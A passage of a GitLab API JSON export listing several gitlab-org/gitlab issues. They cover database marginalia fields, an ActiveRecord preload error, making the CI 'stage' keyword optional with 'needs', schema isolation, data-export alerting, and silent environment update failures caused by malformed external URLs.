Jain","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3236898/avatar.png","web_url":"https://gitlab.com/rajatgitlab"}],"author":{"id":7540787,"username":"asmaa.hassan","name":"Asmaa Hassan","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7540787/avatar.png","web_url":"https://gitlab.com/asmaa.hassan"},"type":"ISSUE","assignee":{"id":3236898,"username":"rajatgitlab","name":"Rajat Jain","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3236898/avatar.png","web_url":"https://gitlab.com/rajatgitlab"},"user_notes_count":22,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337435","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337435","notes":"https://gitlab.com/api/v4/projects/278964/issues/337435/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337435/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337435","relative":"#337435","full":"gitlab-org/gitlab#337435"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91273042,"iid":337433,"project_id":278964,"title":"Marginalia contains information about used `DB`","description":"The `marginalia` should contain information about used DBs.\n\nInclude two fields:\n- `db_name`: to indicate a database spec in use `main`, `ci` (once https://gitlab.com/gitlab-org/gitlab/-/merge_requests/65243 is done), for now `primary`\n- `db_role`: to indicate a database role in use, like `primary` or `replica`\n\n```ruby\n  Ci::Build Load (9.1ms)  SELECT \"ci_builds\".* FROM \"ci_builds\" WHERE \"ci_builds\".\"type\" = 'Ci::Build' ORDER BY \"ci_builds\".\"id\" DESC LIMIT 1 /*application:console,db_name:primary,db_role:primary,line:/data/cache/bundle-2.7.2/ruby/2.7.0/gems/activerecord-6.1.3.2/lib/active_record/connection_adapters/postgresql/database_statements.rb:53:in `exec_query'*/\n```","state":"closed","created_at":"2021-08-02T12:50:57.673Z","updated_at":"2022-05-31T12:22:03.126Z","closed_at":"2021-10-19T16:43:43.665Z","closed_by":{"id":3910448,"username":"craig-gomes","name":"Craig Gomes","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3910448/avatar.png","web_url":"https://gitlab.com/craig-gomes"},"labels":["Category:Pods","ci-decomposition","devops::data_stores","group::pods","missed:14.2","missed:14.3","section::enablement","type::maintenance"],"milestone":{"id":1948708,"iid":64,"group_id":9970,"title":"14.4","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-03-17T21:44:55.682Z","updated_at":"2022-04-21T07:25:38.537Z","due_date":"2021-10-17","start_date":"2021-09-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/64"},"assignees":[{"id":12452,"username":"ayufan","name":"Kamil Trzciński","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a285e30f35d72526fb0954e8fe7cefa?s=80\u0026d=identicon","web_url":"https://gitlab.com/ayufan"}],"author":{"id":12452,"username":"ayufan","name":"Kamil Trzciński","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a285e30f35d72526fb0954e8fe7cefa?s=80\u0026d=identicon","web_url":"https://gitlab.com/ayufan"},"type":"ISSUE","assignee":{"id":12452,"username":"ayufan","name":"Kamil Trzciński","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7a285e30f35d72526fb0954e8fe7cefa?s=80\u0026d=identicon","web_url":"https://gitlab.com/ayufan"},"user_notes_count":1,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337433","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337433","notes":"https://gitlab.com/api/v4/projects/278964/issues/337433/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337433/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337433","relative":"#337433","full":"gitlab-org/gitlab#337433"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6103,"epic":{"id":281355,"iid":6103,"title":"Decomposition: Support for many databases","url":"/groups/gitlab-org/-/epics/6103","group_id":9970,"human_readable_end_date":"Sep 16, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91271199,"iid":337431,"project_id":278964,"title":"ActiveRecord::AssociationNotFoundError: Association named 'metadata' was not found on GenericCommitStatus; perhaps you misspelled it?","description":"https://sentry.gitlab.net/gitlab/gitlabcom/issues/2744930/?referrer=gitlab_plugin\n\n```\nActiveRecord::AssociationNotFoundError: Association named 'metadata' was not found on GenericCommitStatus; perhaps you misspelled it?\nDid you mean?  needs\n               project\n               user\n               pipeline\n  activerecord (6.1.3.2) lib/active_record/associations.rb:313:in `association'\n  activerecord (6.1.3.2) lib/active_record/associations/preloader.rb:159:in `block in grouped_records'\n  activerecord (6.1.3.2) lib/active_record/associations/preloader.rb:157:in `each'\n  activerecord (6.1.3.2) lib/active_record/associations/preloader.rb:157:in `grouped_records'\n  activerecord (6.1.3.2) lib/active_record/associations/preloader.rb:143:in `preloaders_for_one'\n...\n(125 additional frame(s) were not displayed)\n\nAssociation named 'metadata' was not found on GenericCommitStatus; perhaps you misspelled it?\nDid you mean?  needs\n               project\n               user\n               pipeline\n```","state":"closed","created_at":"2021-08-02T12:23:02.724Z","updated_at":"2021-08-10T18:14:11.586Z","closed_at":"2021-08-10T18:08:30.291Z","closed_by":{"id":4626651,"username":"allison.browne","name":"Allison Browne","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4bc33904c3bd3f2dce3db4e5af4ad1ae?s=80\u0026d=identicon","web_url":"https://gitlab.com/allison.browne"},"labels":["Category:Continuous Integration","backend","devops::verify","group::pipeline execution","priority::2","regression","regression:13.11","section::ops","severity::2","type::bug","workflow::verification"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":4626651,"username":"allison.browne","name":"Allison Browne","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4bc33904c3bd3f2dce3db4e5af4ad1ae?s=80\u0026d=identicon","web_url":"https://gitlab.com/allison.browne"}],"author":{"id":402401,"username":"jobbot","name":"Bot","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aaa6738f1ebf25404010884af511b0e7?s=80\u0026d=identicon","web_url":"https://gitlab.com/jobbot"},"type":"ISSUE","assignee":{"id":4626651,"username":"allison.browne","name":"Allison Browne","state":"active","avatar_url":"https://secure.gravatar.com/avatar/4bc33904c3bd3f2dce3db4e5af4ad1ae?s=80\u0026d=identicon","web_url":"https://gitlab.com/allison.browne"},"user_notes_count":14,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337431","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337431","notes":"https://gitlab.com/api/v4/projects/278964/issues/337431/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337431/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337431","relative":"#337431","full":"gitlab-org/gitlab#337431"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":91264356,"iid":337426,"project_id":278964,"title":"Make stage keyword optional when using a job with needs","description":"This issue is based of the [comment](https://gitlab.com/gitlab-org/gitlab/-/issues/30632#note_636033468) \n\n## Problem\nWith the implementation of https://gitlab.com/gitlab-org/gitlab/-/issues/30632 we are still forcing our users to use the stage keyword, however it is not needed as users can now refer to a job in the same stage\n\n## Proposal\n- When using `needs` keyword in a job, stage keyword should be optional.  \n- Jobs without stage should be created in the default test stage (unless configured otherwise)\n\nWe should support the following pipeline configuration\n\n```yaml\n\ntest:\n# stage: test  \n  script: echo 1\n  \nbuild:\n# stage: test\n  script: echo 2\n  needs: [test]\n\ndeploy:\n# stage: test\n  script: echo 2\n  needs: [build]\n\n```\n\nToday this pipeline will work only if we uncomment `stage: test`\n\n### Solution\n\nRemove the required `stage` from `Entry::Job`. There may be some refactoring involved.\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\nRequires unit tests for the changes we're introducing/updating here. Integration and E2E tests not required.","state":"closed","created_at":"2021-08-02T10:41:18.082Z","updated_at":"2021-11-15T15:38:52.056Z","closed_at":"2021-08-12T09:21:24.783Z","closed_by":{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"},"labels":["Category:Pipeline Authoring","auto updated","backend-weight::2","devops::verify","group::pipeline authoring","quad-planning::complete-action","section::ops","type::feature","workflow::verification"],"milestone":{"id":1850126,"iid":62,"group_id":9970,"title":"14.2","description":"","state":"active","created_at":"2021-01-26T16:57:35.404Z","updated_at":"2021-07-22T19:45:42.498Z","due_date":"2021-08-17","start_date":"2021-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/62"},"assignees":[{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"}],"author":{"id":4509877,"username":"dhershkovitch","name":"Dov Hershkovitch","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7daa3113f0359f08a217fa800d9cc1d2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dhershkovitch"},"type":"ISSUE","assignee":{"id":3946912,"username":"lauraX","name":"Laura Montemayor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3946912/avatar.png","web_url":"https://gitlab.com/lauraX"},"user_notes_count":9,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337426","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337426","notes":"https://gitlab.com/api/v4/projects/278964/issues/337426/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337426/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337426","relative":"#337426","full":"gitlab-org/gitlab#337426"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":"on_track"},{"id":91262397,"iid":337424,"project_id":278964,"title":"Use schema search path to hide public tables in ci database","description":"- Use schema search path to hide public tables in ci database\n- To hide public tables, we will need ability to retain visibility for tables such as `schema_migrations`. So create `gitlab_shared` schema and move these tables to that new schema","state":"closed","created_at":"2021-08-02T10:14:45.640Z","updated_at":"2022-05-31T12:22:03.945Z","closed_at":"2022-04-12T02:34:23.112Z","closed_by":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"labels":["Category:Pods","[deprecated] Accepting merge requests","ci-decomposition-followup","devops::data_stores","group::pods","section::enablement","type::maintenance"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":2535118,"username":"tkuah","name":"Thong Kuah","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f7b51bdd49a4914d29504d7ff4c3f7b9?s=80\u0026d=identicon","web_url":"https://gitlab.com/tkuah"},"type":"ISSUE","assignee":null,"user_notes_count":3,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337424","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337424","notes":"https://gitlab.com/api/v4/projects/278964/issues/337424/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337424/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337424","relative":"#337424","full":"gitlab-org/gitlab#337424"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6451,"epic":{"id":314946,"iid":6451,"title":"Use database SCHEMAs to better isolated CI decomposed features","url":"/groups/gitlab-org/-/epics/6451","group_id":9970,"human_readable_timestamp":"\u003cstrong\u003e546\u003c/strong\u003e days elapsed"},"iteration":null,"health_status":null},{"id":98598708,"iid":347298,"project_id":278964,"title":"Add alert in Sisense when there is a drop Service ping payloads number.","description":"### Problem\n\nFollow-up issue from https://gitlab.com/gitlab-org/gitlab/-/issues/337401\n\n### Proposal\n\nAdd an alert in Sisense dashboard when there is a drop in Service Ping payloads number\n\n- We could have an alert in [slack channel](https://gitlab.slack.com/archives/C53JE0CRK)\n- Or we can have an alert on email, what email we should use?\n- What mean to have a drop in a number of payloads? we should define a reference number\n\n### Result\n\n### Next steps (if any)","state":"closed","created_at":"2021-08-02T10:14:40.622Z","updated_at":"2022-03-16T11:39:58.793Z","closed_at":"2022-02-09T15:14:08.643Z","closed_by":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"labels":["PI System Reliability and Monitoring","backend","devops::growth","group::product intelligence","maintenance::workflow","section::growth","type::maintenance","workflow::production"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"user_notes_count":14,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347298","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347298","notes":"https://gitlab.com/api/v4/projects/278964/issues/347298/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347298/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347298","relative":"#347298","full":"gitlab-org/gitlab#347298"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6403,"epic":{"id":312625,"iid":6403,"title":"Gain trust in the collection of product usage data","url":"/groups/gitlab-org/-/epics/6403","group_id":9970,"human_readable_end_date":"Aug 22, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91262004,"iid":337423,"project_id":278964,"title":"Version App - Add alert when jobs are failing in version-app","description":"Related https://gitlab.com/gitlab-org/gitlab/-/issues/337401 #341502\n\n##Summary\n\nAdd an alert when export job fails:\n\nWe export all tables from the version-app week by week.\n\nIt could happen that a week is failing and we are not notified.\n\n## Why\n\n* With current flow, we don't notice when export is falling.\n* The job is marked as successful with no notification.\n* We could miss data and find out later when someone(data team) else is noticing\n\n## Proposals:\n\n- Would be great if we can have an alert in [version app slack channel](https://gitlab.slack.com/archives/C53JE0CRK) if this is possible.\n\n- Add an alert with email.","state":"closed","created_at":"2021-08-02T10:09:25.047Z","updated_at":"2022-03-16T11:40:00.334Z","closed_at":"2022-02-23T12:18:28.484Z","closed_by":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"labels":["PI System Reliability and Monitoring","[deprecated] Accepting merge requests","backend","devops::growth","group::product intelligence","maintenance::pipelines","section::growth","type::maintenance","workflow::in dev"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/337423","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/337423","notes":"https://gitlab.com/api/v4/projects/278964/issues/337423/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/337423/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#337423","relative":"#337423","full":"gitlab-org/gitlab#337423"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7502,"epic":{"id":435544,"iid":7502,"title":"Improve VersionApp export data script","url":"/groups/gitlab-org/-/epics/7502","group_id":9970,"human_readable_end_date":"May 22, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":91258060,"iid":337417,"project_id":278964,"title":"Invalid environment external_url disturbs the entire environment update process","description":"\u003c!-- The first section \"Release notes\" is required if you want to have your release post blog MR auto generated. Currently in BETA, details on the **release post item generator** can be found in the handbook:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg. The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n## Problem to solve \n\nInvalid [environment configurations](https://docs.gitlab.com/ee/ci/yaml/#environment) can interrupt [the environment update process](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/services/deployments/update_environment_service.rb) after a deployment succeeds. For example, you're seeing a successful deployment in the following screenshot, where actually it failed to update the environment status.\n\nhttps://gitlab.com/shinya.maeda/pipeline-playground/-/jobs/2364758866\n\n![2022-04-22_18-53](/uploads/4c2d0d51b20bc81ecb466cc9284b636d/2022-04-22_18-53.png)\n\nThe deployment job should update [the environment URL](https://gitlab.com/shinya.maeda/pipeline-playground/-/environments/2235830) to `www.google.com`, but since it's malformed URL, the system can't update it.\n\n### Customer impact\n\nThis silent failure often gives support engineers and customers having hard time to debug the problems. \n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/332374#note_594418867\n\n\u003e We've found the problem: the environment tier and the deployment-related merge request metrics are not going to be updated due to the missing `http` or `https` URL prefix under the `environment.url` YAML key. The validation on the `Environment` record will silently fail here: https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/services/deployments/update_environment_service.rb#L34\n\n### Errors on SaaS \n\nYou can see how often this environment update failure happens on SaaS:\n\n- https://sentry.gitlab.net/gitlab/gitlabcom/issues/2678585/?query=EnvironmentUpdateFailure\n- https://log.gprd.gitlab.net/goto/f08bab70-c220-11ec-b73f-692cc1ae8214\n\nAt the moment, roughly 4,000 of deployments encounter the failure every day. There is no feedback feature to let users/customers be aware of this problem.\n\nHere is the frequency per error message: https://log.gprd.gitlab.net/goto/b4f34b10-c223-11ec-afaf-2bca15dfbf33\n\n![2022-04-22_19-07](/uploads/af4c94628252dc8b478f8b7544716a36/2022-04-22_19-07.png)\n\nWe can see that 100% of error messages are related to the [`environment.url` keyword](https://docs.gitlab.com/ee/ci/yaml/#environmenturl).\n\n### Intended users\n\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n--\u003e\n\n### Metrics \n\nTracking the absolute number of failed pipelines due to invalid environments.\n\n\u003c!-- How are you going to track usage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n### User experience goal\n\nThe user should be able to see _why_ their environment failed to update\n\n## Proposal: Soft validation on External URL\n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/337417#note_922931598\n\n- Since `external_url` is used for that users accessing to the website, and it's not used for internal server request, we can persist an URL without `AddressableUrlValidator`.\n- Since we expose the `external_url` as a button in some pages (environment page, MR page, etc), we sanitize the URL not to include javascript code.\n\n\u003cdetails\u003e\n\n\u003csummary\u003e Previous proposal (turned down due to drawbacks) \u003c/summary\u003e\n\n## Proposal: Validate Environment URL at pipeline creation\n\nWhen a new pipeline is created, we additionally validate the Environment URL on each job. We expand the Environment URL (e.g. `url: appname-$CI_COMMIT_REF_SLUG`) based on the [CI/CD variables](https://docs.gitlab.com/ee/ci/variables/). If it's invalid, we mark the job as `failed` status similar to what we did in [the previous issue](https://gitlab.com/gitlab-org/gitlab/-/issues/21182).\n\nA few notes:\n\n- Since the job is failed, users almost 100% notice that something went wrong.\n- Easy to implement. The weight would be 1-2.\n- This is a breaking change that could disturb user's CI/CD workflow. (This might not even a con at %\"15.0\", because we allow breaking change at major update.) We should communicate with affected customers in advance to mitigate the impact.\n- There is an edge case that users can [set dynamic environment URLs after a job finishes](https://docs.gitlab.com/ee/ci/environments/#set-dynamic-environment-urls-after-a-job-finishes). We can't detect this error by this approach.\n\n### UI/UX\n\nSurface the following error message to the pipeline job page if an environment update is failed:\n\n![1.0__env-update-failed__invalid-url](/uploads/6ac9a7fd74dcc8f4fa87e876cf57cfe7/1.0__env-update-failed__invalid-url.png)\n\n**SSOT ~\"UI text\"***\n\u003e This job could not be executed because it would update the environment with an invalid URL. [Learn More.](https://docs.gitlab.com/ee/ci/yaml/index.html#environmenturl)\n\nDocumentation link: https://docs.gitlab.com/ee/ci/yaml/index.html#environmenturl\n\nSimilarly, it might be the case the pipeline fails because both the name and URL are invalid. In that case, the message can refer both, and the documentation link take the user to the parent section:\n\n![1.1__env-update-failed__invalid-url-and-name](/uploads/0f89f5f4080c143f2b0517e7682ed85e/1.1__env-update-failed__invalid-url-and-name.png)\n\n**SSOT ~\"UI text\"***\n\u003e This job could not be executed because it would update the environment with an invalid URL and name. [Learn more.](https://docs.gitlab.com/ee/ci/yaml/index.html#environment)\n\nDocumentation link: https://docs.gitlab.com/ee/ci/yaml/index.html#environment\n\n\u003c!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey --\u003e\n\n\u003c/details\u003e\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\nNo expected documentation change, other than pointing to https://docs.gitlab.com/ee/ci/yaml/index.html#environmenturl\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html 